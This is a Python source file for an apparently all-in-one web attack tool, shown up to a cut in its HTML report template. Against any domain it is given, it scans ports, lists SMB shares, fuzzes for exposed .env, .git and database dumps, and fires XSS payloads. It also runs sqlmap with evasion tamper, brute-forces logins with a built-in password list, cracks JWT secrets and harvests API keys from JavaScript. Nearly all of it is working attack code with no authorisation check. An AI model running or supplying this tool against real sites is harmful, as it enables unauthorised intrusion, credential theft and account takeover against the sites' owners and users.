#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import json
import time
import argparse
import asyncio
import re
import base64
import hashlib
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque

import requests
import urllib3
from colorama import Fore, Style, init

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

try:
    import whois
except ImportError:
    whois = None

try:
    import aiodns
except ImportError:
    aiodns = None

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    sync_playwright = None

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    BeautifulSoup = None

try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False
    jwt = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
HEADERS = {"User-Agent": USER_AGENT}
TIMEOUT = 10

COMMON_DIRS = [
    "/admin", "/admin/login", "/admin.php", "/administrator",
    "/login", "/signin", "/auth", "/auth/login",
    "/dashboard", "/panel", "/controlpanel", "/cp",
    "/api", "/api/v1", "/api/v2", "/api/admin", "/graphql",
    "/rest", "/swagger", "/swagger-ui", "/docs", "/openapi.json",
    "/config", "/config.php", "/settings", "/settings.php",
    "/.env", "/.env.backup", "/.env.local",
    "/debug", "/debug.log", "/error.log",
    "/.git", "/.git/config", "/.git/HEAD",
    "/backup", "/backups", "/backup.zip", "/site.zip",
    "/dump.sql", "/database.sql", "/db.sql",
    "/wp-admin", "/wp-login.php", "/wp-content",
    "/administrator", "/joomla", "/user/login",
    "/phpmyadmin", "/pma", "/mysql",
    "/server-status", "/status",
    "/dev", "/development", "/staging", "/test",
    "/testing", "/old", "/beta", "/demo",
    "/console", "/shell", "/terminal",
    "/upload", "/uploads", "/files",
    "/tmp", "/temp",
    "/robots.txt", "/sitemap.xml",
    "/crossdomain.xml", "/security.txt",
    "/jenkins", "/gitlab", "/ci", "/ci/cd",
    "/kibana", "/grafana", "/prometheus",
    "/hidden", "/secret", "/private",
    "/internal", "/intranet"
]

# FIXED: Raw strings ile XSS payload'lar - escape karakter sorunu cozuldu
XSS_PAYLOADS = [
    r"<script>alert(1)</script>",
    r"<script>alert(document.domain)</script>",
    r"<script>confirm(1)</script>",
    r"<script>prompt(1)</script>",
    r'\"><script>alert(1)</script>',
    r"'><script>alert(1)</script>",
    r"</script><script>alert(1)</script>",
    r"</title><script>alert(1)</script>",
    r"<img src=x onerror=alert(1)>",
    r"<img src=invalid onerror=confirm(1)>",
    r"<img src=x onerror=prompt(1)>",
    r"<svg onload=alert(1)>",
    r"<svg/onload=alert(1)>",
    r"<svg><script>alert(1)</script></svg>",
    r"<body onload=alert(1)>",
    r"<body onmouseover=alert(1)>",
    r"<div onmouseover=alert(1)>X</div>",
    r"<input onfocus=alert(1) autofocus>",
    r"javascript:alert(1)",
    r"javascript:confirm(1)",
    r"javascript:prompt(1)",
    r'" onmouseover=alert(1) x="',
    r"' onmouseover=alert(1) x='",
    r'" autofocus onfocus=alert(1) x="',
    r"%3Cscript%3Ealert(1)%3C/script%3E",
    r"%3Cimg%20src=x%20onerror=alert(1)%3E",
    r"&lt;script&gt;alert(1)&lt;/script&gt;",
    r"'\"><svg/onload=alert(1)>",
    r'\"><img/src=x/onerror=alert(1)>',
    r'\"><iframe src=javascript:alert(1)>',
    r"${alert(1)}",
    r"{{alert(1)}}",
    r"<%= alert(1) %>",
    r"<script>document.body.innerHTML='XSS'</script>",
    r"<script>eval('alert(1)')</script>"
]

LOGIN_PATHS = [
    "/login", "/admin", "/wp-login.php", "/administrator",
    "/user/login", "/signin", "/auth", "/panel"
]

COMMON_USERS = ["admin", "root", "user", "test", "administrator", "guest"]

CORS_TEST_ORIGINS = [
    "https://evil.com",
    "http://evil.com",
    "null",
    "https://attacker.com",
    "http://localhost",
    "https://localhost",
    "http://127.0.0.1",
    "https://127.0.0.1"
]

JWT_COMMON_SECRETS = [
    "secret", "secret123", "password", "123456", "admin",
    "jwt", "token", "key", "supersecret", "changeme",
    "default", "password123", "secretkey", "auth",
    "jwtsecret", "token123", "key123", "supersecretkey"
]


class Logger:
    def __init__(self, report_file=None):
        self.report_file = report_file

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        color = {
            "INFO": Fore.CYAN,
            "WARN": Fore.YELLOW,
            "FAIL": Fore.RED,
            "OK": Fore.GREEN,
            "PHASE": Fore.MAGENTA
        }.get(level, Fore.WHITE)
        line = f"[{ts}] [{level}] {msg}"
        print(f"{color}{line}{Style.RESET_ALL}")
        if self.report_file:
            self.report_file.write(line + "\n")

    def phase(self, text):
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"  {Fore.MAGENTA}{text}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        if self.report_file:
            self.report_file.write(f"\n{'='*60}\n  {text}\n{'='*60}\n")


class RateLimiter:
    def __init__(self, delay=0.5):
        self.delay = delay
        self.last = 0

    def sleep(self):
        elapsed = time.time() - self.last
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self.last = time.time()


def resolve_domain(target):
    if "://" not in target:
        target = "http://" + target
    parsed = urlparse(target)
    host = parsed.netloc if parsed.netloc else parsed.path
    if "@" in host:
        host = host.split("@")[-1]
    if ":" in host:
        host = host.split(":")[0]
    return host.strip().lower()


def fetch_html(domain, logger, session):
    logger.phase("PHASE 1: HTML FETCH & TECH FINGERPRINT")
    variants = [f"http://{domain}", f"https://{domain}",
                f"http://www.{domain}", f"https://www.{domain}"]

    for url in variants:
        try:
            logger.log(f"Trying {url} ...")
            r = session.get(url, timeout=TIMEOUT, headers=HEADERS)
            logger.log(f"HTTP {r.status_code} - {len(r.text)} bytes", "OK")

            path = f"{domain}_index.html"
            with open(path, "w", encoding="utf-8") as f:
                f.write(r.text)
            logger.log(f"Saved: {path}", "OK")

            tech = fingerprint_tech(r)
            logger.log(f"Tech: {tech}")
            return r.text, path, tech
        except Exception as e:
            logger.log(f"Failed: {url} -> {e}", "WARN")

    logger.log("HTML fetch failed.", "FAIL")
    return None, None, {}


def fingerprint_tech(response):
    tech = {}
    h = response.headers
    if "Server" in h:
        tech["server"] = h["Server"]
    if "X-Powered-By" in h:
        tech["powered_by"] = h["X-Powered-By"]

    missing = []
    for hdr in ["X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options", "Strict-Transport-Security"]:
        if hdr not in h:
            missing.append(hdr)
    if missing:
        tech["missing_headers"] = missing

    txt = response.text.lower()
    if "wp-content" in txt or "wordpress" in txt:
        tech["cms"] = "WordPress"
    elif "drupal" in txt:
        tech["cms"] = "Drupal"
    elif "joomla" in txt:
        tech["cms"] = "Joomla"
    elif "django" in txt:
        tech["cms"] = "Django"
    elif "laravel" in txt:
        tech["cms"] = "Laravel"
    elif "rails" in txt or "ruby on rails" in txt:
        tech["cms"] = "Ruby on Rails"
    elif "spring" in txt:
        tech["cms"] = "Spring"
    elif "express" in txt:
        tech["cms"] = "Express.js"
    elif "next.js" in txt or "_next" in txt:
        tech["cms"] = "Next.js"
    elif "react" in txt:
        tech["framework"] = "React"
    elif "vue" in txt:
        tech["framework"] = "Vue.js"
    elif "angular" in txt:
        tech["framework"] = "Angular"

    js_libs = []
    if "jquery" in txt:
        js_libs.append("jQuery")
    if "bootstrap" in txt:
        js_libs.append("Bootstrap")
    if "axios" in txt:
        js_libs.append("Axios")
    if "fetch(" in txt:
        js_libs.append("Fetch API")
    if "websocket" in txt or "ws://" in txt:
        js_libs.append("WebSocket")
    if js_libs:
        tech["js_libraries"] = js_libs

    api_patterns = re.findall(r'["\']((?:/api|/graphql|/rest|/v\d+)[^"\'\s]*)["\']', response.text, re.IGNORECASE)
    if api_patterns:
        tech["api_endpoints_in_html"] = list(set(api_patterns[:20]))

    if "authorization" in txt or "jwt" in txt or "bearer" in txt:
        tech["jwt_detected"] = True

    cors_headers = {}
    for hdr in ["Access-Control-Allow-Origin", "Access-Control-Allow-Methods", "Access-Control-Allow-Headers", "Access-Control-Allow-Credentials"]:
        if hdr in h:
            cors_headers[hdr] = h[hdr]
    if cors_headers:
        tech["cors_headers"] = cors_headers

    return tech


def scan_port_single(args):
    domain, port = args
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((domain, port)) == 0:
                try:
                    svc = socket.getservbyport(port, "tcp")
                except (OSError, ValueError):
                    svc = "unknown"
                return (port, svc)
    except Exception:
        pass
    return None


def scan_ports(domain, max_port, logger, threads=150):
    logger.phase("PHASE 2: PORT SCAN")
    open_ports = []
    ports = list(range(1, max_port + 1))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port_single, (domain, p)): p for p in ports}
        iterator = as_completed(futures)
        if tqdm:
            iterator = tqdm(iterator, total=len(ports), desc="Ports", ncols=70)

        for f in iterator:
            res = f.result()
            if res:
                port, svc = res
                logger.log(f"OPEN {port}/{svc}", "OK")
                open_ports.append(res)

    logger.log(f"Found {len(open_ports)} open ports")
    return sorted(open_ports)


def smb_probe(domain, logger):
    logger.phase("PHASE 3: SMB PROBE")
    smb_ports = [139, 445]
    found = []
    for port in smb_ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                if s.connect_ex((domain, port)) == 0:
                    logger.log(f"SMB port {port} OPEN", "OK")
                    found.append(port)
        except Exception:
            pass

    if found:
        logger.log("SMB detected. Consider enum4linux.", "WARN")
        try:
            out = subprocess.run(
                ["smbclient", "-L", f"//{domain}/", "-N"],
                capture_output=True, text=True, timeout=10
            )
            if out.stdout:
                logger.log("SMB shares retrieved")
                return out.stdout
        except Exception as e:
            logger.log(f"smbclient failed: {e}", "WARN")
    else:
        logger.log("SMB ports closed")
    return None


def subdomain_sync(domain, wordlist, logger, limit):
    logger.phase("PHASE 4: SUBDOMAIN ENUM (sync)")
    found = []
    count = 0

    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            subs = []
            for line in f:
                sub = line.strip()
                if (sub and not sub.startswith("#") and 
                    sub.replace("-", "").replace("_", "").isalnum() and
                    not sub.startswith(".") and not sub.endswith(".") and
                    len(sub) > 0):
                    subs.append(sub)
    except Exception as e:
        logger.log(f"Wordlist error: {e}", "FAIL")
        return found

    if limit > 0:
        subs = subs[:limit]

    logger.log(f"Testing {len(subs)} subdomains...")

    for sub in tqdm(subs, desc="Subdomains", ncols=70) if tqdm else subs:
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            logger.log(f"FOUND {full} -> {ip}", "OK")
            found.append((full, ip))
            count += 1
        except (socket.gaierror, UnicodeEncodeError):
            pass
        if limit > 0 and count >= limit:
            break

    logger.log(f"Total subdomains: {len(found)}")
    return found


async def subdomain_async(domain, wordlist, logger, limit):
    logger.phase("PHASE 4: SUBDOMAIN ENUM (async)")
    found = []
    resolver = aiodns.DNSResolver()

    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            subs = []
            for line in f:
                sub = line.strip()
                if (sub and not sub.startswith("#") and 
                    sub.replace("-", "").replace("_", "").isalnum() and
                    not sub.startswith(".") and not sub.endswith(".") and
                    len(sub) > 0):
                    subs.append(sub)
    except Exception as e:
        logger.log(f"Wordlist error: {e}", "FAIL")
        return found

    if limit > 0:
        subs = subs[:limit]

    logger.log(f"Testing {len(subs)} subdomains...")

    async def query(sub):
        full = f"{sub}.{domain}"
        try:
            result = await resolver.query(full, "A")
            return full, result[0].host
        except Exception:
            return None

    tasks = [query(s) for s in subs]
    for coro in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Subdomains") if tqdm else asyncio.as_completed(tasks):
        res = await coro
        if res:
            logger.log(f"FOUND {res[0]} -> {res[1]}", "OK")
            found.append(res)

    logger.log(f"Total subdomains: {len(found)}")
    return found


def xss_probe(domain, logger, session, limiter):
    logger.phase("PHASE 5: XSS PROBE")
    pages = [
        f"http://{domain}", f"https://{domain}",
        f"http://{domain}/search", f"http://{domain}/contact",
        f"http://{domain}/login"
    ]
    hits = 0

    for page in pages:
        try:
            limiter.sleep()
            r = session.get(page, timeout=5, headers=HEADERS)
            if "<form" not in r.text.lower() and "input" not in r.text.lower():
                continue

            for payload in XSS_PAYLOADS:
                try:
                    limiter.sleep()
                    test = f"{page}?q={payload}&search={payload}&id={payload}"
                    r2 = session.get(test, timeout=5, headers=HEADERS)
                    if payload in r2.text:
                        ctx = check_context(r2.text, payload)
                        logger.log(f"XSS REFLECTED [{ctx}]: {test}", "WARN")
                        hits += 1
                except Exception:
                    pass
        except Exception:
            pass

    logger.log(f"XSS tests done. Reflected: {hits}")
    return hits


def check_context(html, payload):
    idx = html.find(payload)
    if idx == -1:
        return "none"
    window = html[max(0, idx-40):idx+len(payload)+40]
    if f"<script>{payload}" in window or f"<script>{payload}</script>" in window:
        return "script"
    if "=" in window and (window.count('"') % 2 == 1 or window.count("'") % 2 == 1):
        return "attr"
    return "html"


def sqlmap_probe(domain, logger):
    logger.phase("PHASE 6: SQLMAP INTEGRATION")
    targets = [f"http://{domain}", f"https://{domain}"]

    for url in targets:
        logger.log(f"SQLMap -> {url}")
        cmd = [
            "sqlmap", "-u", url, "--batch", "--random-agent",
            "--level", "2", "--risk", "2", "--threads", "4",
            "--time-sec", "5", "--output-dir", f"./sqlmap_{domain}",
            "--tamper", "space2comment"
        ]
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if out.stdout:
                with open(f"{domain}_sqlmap.txt", "w") as f:
                    f.write(out.stdout)
                if "vulnerable" in out.stdout.lower() or "injectable" in out.stdout.lower():
                    logger.log("SQL INJECTION DETECTED!", "FAIL")
                    return True
                logger.log("No obvious SQLi found")
                return False
        except subprocess.TimeoutExpired:
            logger.log("SQLMap timeout", "WARN")
        except FileNotFoundError:
            logger.log("sqlmap not installed", "FAIL")
        except Exception as e:
            logger.log(f"SQLMap error: {e}", "WARN")
    return False


def dir_fuzz(domain, logger, session, limiter):
    logger.phase("PHASE 7: DIRECTORY FUZZING")
    found = []
    for path in COMMON_DIRS:
        for proto in ["http", "https"]:
            url = f"{proto}://{domain}{path}"
            try:
                limiter.sleep()
                r = session.get(url, timeout=8, headers=HEADERS, allow_redirects=False)
                if r.status_code in (200, 301, 302, 401, 403):
                    logger.log(f"[{r.status_code}] {url}", "OK" if r.status_code == 200 else "WARN")
                    found.append((url, r.status_code, len(r.text)))
            except Exception:
                pass
    logger.log(f"Found {len(found)} interesting paths")
    return found


def brute_login(domain, wordlist, logger, session, limiter):
    logger.phase("PHASE 8: LOGIN BRUTE-FORCE")
    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()][:100]
    except Exception:
        passwords = ["123456", "123456789", "1234", "12345", "12345678", "password", "password1", "passw0rd", "pass123", "admin", "admin123", "administrator", "root", "toor", "guest", "qwerty", "qwerty123", "qwerty1", "asdfgh", "zxcvbn", "1q2w3e4r", "1q2w3e", "qwertyuiop", "111111", "000000", "121212", "123123", "654321", "7777777", "987654321", "112233", "letmein", "welcome", "login", "changeme", "default", "secret", "access", "test", "test123", "adminadmin", "admin1", "admin1234", "root123", "toor123", "ubuntu", "debian", "linux", "oracle", "mysql", "password123", "admin2024", "admin2025", "rootroot", "pass1234", "welcome123", "login123", "ctf123", "hackthebox", "tryhackme", "pentest", "security"]

    candidates = []
    for path in LOGIN_PATHS:
        url = f"http://{domain}{path}"
        try:
            limiter.sleep()
            baseline = session.get(url, timeout=5, headers=HEADERS)
            base_len = len(baseline.text)
        except Exception:
            continue

        for user in COMMON_USERS:
            for pwd in passwords[:10]:
                try:
                    limiter.sleep()
                    data = {"username": user, "password": pwd, "log": user, "pwd": pwd}
                    r = session.post(url, data=data, timeout=5, headers=HEADERS, allow_redirects=False)

                    if is_success(r, base_len):
                        logger.log(f"CREDENTIALS? {user}:{pwd} @ {url}", "WARN")
                        candidates.append((url, user, pwd))
                except Exception:
                    pass

    logger.log(f"Brute-force finished. Candidates: {len(candidates)}")
    return candidates


def is_success(response, baseline_len):
    if response.status_code in (301, 302, 303):
        return True
    text = response.text.lower()
    if any(k in text[:800] for k in ["dashboard", "welcome", "logout", "admin panel", "profile"]):
        return True
    if abs(len(response.text) - baseline_len) > baseline_len * 0.25 and len(response.text) > 200:
        if not any(k in text[:500] for k in ["error", "invalid", "wrong", "failed", "incorrect"]):
            return True
    return False


def whois_lookup(domain, logger):
    logger.phase("PHASE 9: WHOIS")
    if not whois:
        logger.log("python-whois not installed", "WARN")
        return None
    try:
        w = whois.whois(domain)
        logger.log(f"Registrar: {w.registrar}")
        logger.log(f"Creation: {w.creation_date}")
        logger.log(f"Emails: {w.emails}")
        return {
            "registrar": str(w.registrar),
            "creation": str(w.creation_date),
            "emails": str(w.emails)
        }
    except Exception as e:
        logger.log(f"WHOIS failed: {e}", "WARN")
        return None


def recursive_crawl(domain, logger, session, limiter, max_depth=2, max_pages=50):
    logger.phase("PHASE 10: RECURSIVE CRAWLER")

    if not BS4_AVAILABLE:
        logger.log("BeautifulSoup4 not installed. Skipping crawler.", "WARN")
        logger.log("Install: pip install beautifulsoup4", "INFO")
        return []

    base_urls = [f"http://{domain}", f"https://{domain}"]
    visited = set()
    found_urls = []
    queue = deque()

    for base in base_urls:
        queue.append((base, 0))

    while queue and len(visited) < max_pages:
        url, depth = queue.popleft()

        if url in visited or depth > max_depth:
            continue
        visited.add(url)

        try:
            limiter.sleep()
            r = session.get(url, timeout=5, headers=HEADERS)

            if "text/html" not in r.headers.get("Content-Type", ""):
                continue

            soup = BeautifulSoup(r.text, "html.parser")

            for tag in soup.find_all(["a", "form", "link", "script", "img"]):
                href = tag.get("href") or tag.get("src") or tag.get("action")
                if href:
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    if parsed.netloc == domain or parsed.netloc == f"www.{domain}" or parsed.netloc == "":
                        if full_url not in visited:
                            queue.append((full_url, depth + 1))
                            found_urls.append(full_url)

            logger.log(f"Crawled [{r.status_code}] {url} | Found {len(found_urls)} links")

        except Exception as e:
            pass

    unique_urls = list(set(found_urls))
    logger.log(f"Crawl complete. Total unique URLs: {len(unique_urls)}")
    return unique_urls


def extract_js_endpoints(domain, logger, session, limiter, crawled_urls):
    logger.phase("PHASE 11: JS ENDPOINT EXTRACTOR")

    endpoints = set()
    js_files = []

    for url in crawled_urls:
        if url.endswith(".js") or ".js?" in url:
            js_files.append(url)

    if not js_files:
        logger.log("No JS files found in crawl. Trying direct fetch...", "WARN")
        for proto in ["http", "https"]:
            try:
                limiter.sleep()
                r = session.get(f"{proto}://{domain}", timeout=5, headers=HEADERS)
                soup = BeautifulSoup(r.text, "html.parser") if BS4_AVAILABLE else None
                if soup:
                    for script in soup.find_all("script", src=True):
                        src = urljoin(f"{proto}://{domain}", script["src"])
                        if ".js" in src:
                            js_files.append(src)
            except:
                pass

    endpoint_patterns = [
        r'["\']((?:/api|/graphql|/rest|/v\d+|/auth|/admin|/user|/login|/logout|/register|/upload|/download|/search|/config)[^"\'\s]*)["\']',
        r'(?:url|endpoint|path|route|baseURL)\s*[:=]\s*["\']([^"\']+)["\']',
        r'(?:GET|POST|PUT|DELETE|PATCH)\s+["\']([^"\']+)["\']',
        r'fetch\(["\']([^"\']+)["\']',
        r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
        r'\.then\(.*?\)\s*\.get\(["\']([^"\']+)["\']',
        r'["\']((?:ws://|wss://)[^"\']+)["\']',
    ]

    secret_patterns = [
        r'(?:api[_-]?key|apikey|token|secret|password|passwd|pwd)\s*[:=]\s*["\']([^"\']{8,})["\']',
        r'(?:aws_access_key_id|aws_secret_access_key)\s*[:=]\s*["\']([^"\']+)["\']',
        r'(?:private[_-]?key|secret[_-]?key)\s*[:=]\s*["\']([^"\']+)["\']',
    ]

    for js_url in js_files[:20]:
        try:
            limiter.sleep()
            r = session.get(js_url, timeout=10, headers=HEADERS)
            js_content = r.text

            for pattern in endpoint_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    if len(match) > 2:
                        endpoints.add(match)

            secrets_found = []
            for pattern in secret_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                secrets_found.extend(matches)

            if secrets_found:
                logger.log(f"SECRETS in {js_url}: {len(secrets_found)} potential leaks", "WARN")
                for secret in secrets_found[:3]:
                    logger.log(f"  -> {secret[:50]}...", "WARN")

            logger.log(f"Parsed {js_url} | Endpoints: {len(endpoints)}")

        except Exception as e:
            pass

    endpoints_list = sorted(list(endpoints))
    logger.log(f"Total unique endpoints found: {len(endpoints_list)}")
    return endpoints_list


def cors_check(domain, logger, session, limiter):
    logger.phase("PHASE 12: CORS MISCONFIGURATION CHECKS")

    findings = []
    test_urls = [f"http://{domain}", f"https://{domain}"]

    for base_url in test_urls:
        for origin in CORS_TEST_ORIGINS:
            try:
                limiter.sleep()
                headers = {
                    "Origin": origin,
                    "User-Agent": USER_AGENT
                }
                r = session.get(base_url, timeout=5, headers=headers)

                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")

                if acao == "*" and acac.lower() == "true":
                    logger.log(f"CRITICAL: Wildcard + Credentials on {base_url} with Origin: {origin}", "FAIL")
                    findings.append({
                        "url": base_url,
                        "origin": origin,
                        "severity": "CRITICAL",
                        "issue": "Access-Control-Allow-Origin: * with credentials enabled"
                    })
                elif acao == origin:
                    if acac.lower() == "true":
                        logger.log(f"HIGH: Reflecting origin with credentials: {origin} -> {base_url}", "WARN")
                        findings.append({
                            "url": base_url,
                            "origin": origin,
                            "severity": "HIGH",
                            "issue": "Origin reflected with credentials"
                        })
                    else:
                        logger.log(f"MEDIUM: Reflecting origin without credentials: {origin} -> {base_url}", "WARN")
                        findings.append({
                            "url": base_url,
                            "origin": origin,
                            "severity": "MEDIUM",
                            "issue": "Origin reflected without credentials"
                        })
                elif acao == "*":
                    logger.log(f"LOW: Wildcard CORS on {base_url}", "WARN")
                    findings.append({
                        "url": base_url,
                        "origin": origin,
                        "severity": "LOW",
                        "issue": "Access-Control-Allow-Origin: *"
                    })

            except Exception:
                pass

    logger.log(f"CORS checks complete. Findings: {len(findings)}")
    return findings


def jwt_analyze(domain, logger, session, limiter):
    logger.phase("PHASE 13: JWT ANALYZER")

    if not JWT_AVAILABLE:
        logger.log("PyJWT not installed. Skipping JWT analysis.", "WARN")
        logger.log("Install: pip install pyjwt", "INFO")
        return []

    findings = []

    jwt_locations = [
        f"http://{domain}",
        f"https://{domain}",
        f"http://{domain}/api",
        f"https://{domain}/api",
        f"http://{domain}/login",
        f"https://{domain}/login",
    ]

    collected_tokens = []

    for url in jwt_locations:
        try:
            limiter.sleep()
            r = session.get(url, timeout=5, headers=HEADERS)

            jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
            tokens = re.findall(jwt_pattern, r.text)
            collected_tokens.extend(tokens)

            for cookie in r.cookies:
                cookie_val = str(cookie.value)
                if cookie_val.startswith("eyJ") and "." in cookie_val:
                    collected_tokens.append(cookie_val)

            auth_header = r.headers.get("Authorization", "")
            if auth_header.startswith("Bearer eyJ"):
                collected_tokens.append(auth_header.replace("Bearer ", ""))

        except Exception:
            pass

    unique_tokens = list(set(collected_tokens))

    for token in unique_tokens[:10]:
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            logger.log(f"JWT Found: alg={header.get('alg', 'unknown')}")
            logger.log(f"  Payload keys: {list(payload.keys())}")

            token_findings = {
                "token_preview": token[:50] + "...",
                "algorithm": header.get("alg"),
                "payload_keys": list(payload.keys()),
                "issues": []
            }

            if header.get("alg") == "none":
                logger.log("CRITICAL: JWT uses 'none' algorithm!", "FAIL")
                token_findings["issues"].append("none_algorithm")

            if header.get("alg") in ["HS256", "HS384", "HS512"]:
                for secret in JWT_COMMON_SECRETS:
                    try:
                        jwt.decode(token, secret, algorithms=[header.get("alg")])
                        logger.log(f"CRITICAL: JWT cracked with secret: {secret}", "FAIL")
                        token_findings["issues"].append(f"weak_secret:{secret}")
                        break
                    except:
                        pass

            sensitive_keys = ["password", "secret", "admin", "role", "privilege", "email", "username", "id"]
            for key in payload:
                if any(sk in key.lower() for sk in sensitive_keys):
                    logger.log(f"WARN: JWT contains sensitive key: {key}", "WARN")
                    token_findings["issues"].append(f"sensitive_data:{key}")

            findings.append(token_findings)

        except Exception as e:
            logger.log(f"JWT parse error: {e}", "WARN")

    logger.log(f"JWT analysis complete. Tokens analyzed: {len(findings)}")
    return findings


def take_screenshots(domain, logger, crawled_urls):
    logger.phase("PHASE 14: SCREENSHOT SYSTEM")

    if not PLAYWRIGHT_AVAILABLE:
        logger.log("Playwright not installed. Skipping screenshots.", "WARN")
        logger.log("Install: pip install playwright && playwright install chromium", "INFO")
        return []

    screenshots = []
    screenshot_dir = f"screenshots_{domain}"
    os.makedirs(screenshot_dir, exist_ok=True)

    urls_to_shoot = [f"http://{domain}", f"https://{domain}"]

    interesting_paths = ["/admin", "/login", "/dashboard", "/api", "/upload", "/config"]
    for path in interesting_paths:
        urls_to_shoot.append(f"http://{domain}{path}")
        urls_to_shoot.append(f"https://{domain}{path}")

    urls_to_shoot.extend(crawled_urls[:10])
    urls_to_shoot = list(set(urls_to_shoot))

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent=USER_AGENT,
                viewport={"width": 1920, "height": 1080}
            )

            for url in urls_to_shoot:
                try:
                    page = context.new_page()
                    page.goto(url, timeout=15000, wait_until="networkidle")

                    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', url.replace("https://", "").replace("http://", ""))[:50]
                    filename = f"{screenshot_dir}/{safe_name}.png"

                    page.screenshot(path=filename, full_page=True)
                    screenshots.append({"url": url, "file": filename})
                    logger.log(f"Screenshot: {url} -> {filename}", "OK")

                    page.close()
                except Exception as e:
                    logger.log(f"Screenshot failed for {url}: {e}", "WARN")

            browser.close()

    except Exception as e:
        logger.log(f"Playwright error: {e}", "FAIL")

    logger.log(f"Screenshots taken: {len(screenshots)}")
    return screenshots


def generate_html_report(data, domain, timestamp, logger=None):
    if logger:
        logger.phase("PHASE 15: HTML REPORT GENERATION")

    html_path = f"latent_report_{domain}_{timestamp}.html"

    severity_colors = {
        "CRITICAL": "#dc3545",
        "HIGH": "#fd7e14",
        "MEDIUM": "#ffc107",
        "LOW": "#17a2b8",
        "INFO": "#6c757d"
    }

    cors_html = ""
    for finding in data.get("cors_findings", []):
        color = severity_colors.get(finding.get("severity", "INFO"), "#6c757d")
        cors_html += f"""
        <div class="finding" style="border-left-color: {color}">
            <span class="badge" style="background: {color}">{finding.get('severity', 'INFO')}</span>
            <strong>{finding.get('issue', '')}</strong><br>
            URL: {finding.get('url', '')}<br>
            Origin tested: {finding.get('origin', '')}
        </div>
        """

    jwt_html = ""
    for finding in data.get("jwt_findings", []):
        issues = finding.get("issues", [])
        issues_str = ", ".join(issues) if issues else "None"
        jwt_html += f"""
        <div class="finding">
            <strong>Algorithm:</strong> {finding.get('algorithm', 'unknown')}<br>
            <strong>Token:</strong> {finding.get('token_preview', 'N/A')}<br>
            <strong>Payload keys:</strong> {', '.join(finding.get('payload_keys', []))}<br>
            <strong>Issues:</strong> <span style="color: {'#dc3545' if issues else '#28a745'}">{issues_str}</span>
        </div>
        """

    screenshots_html = ""
    for ss in data.get("screenshots", []):
        screenshots_html += f"""
        <div class="screenshot">
            <h4>{ss.get('url', '')}</h4>
            <img src="{ss.get('file', '')}" alt="Screenshot" style="max-width: 100%; border: 1px solid #ddd; border-radius: 4px;">
        </div>
        """

    crawl_html = ""
    for url in data.get("crawled_urls", [])[:50]:
        crawl_html += f"<li>{url}</li>\n"

    js_html = ""
    for endpoint in data.get("js_endpoints", [])[:50]:
        js_html += f"<li>{endpoint}</li>\n"

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LATENT Report - {domain}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; color: #333; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
        header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px 20px; text-align: center; border-radius: 8px; margin-bottom: 30px; }}
        header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
        header p {{ opacity: 0.9; font-size: 1.1em; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }}
        .card {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }}
        .card h3 {{ color: #667eea; font-size: 2em; margin-bottom: 5px; }}
        .card p {{ color: #666; font-size: 0.9em; }}
        .section {{ background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px; }}
        .section h2 {{ color: #667eea; border-bottom: 2px solid #667eea; padding-bottom: 10px; margin-bottom: 20px; }}
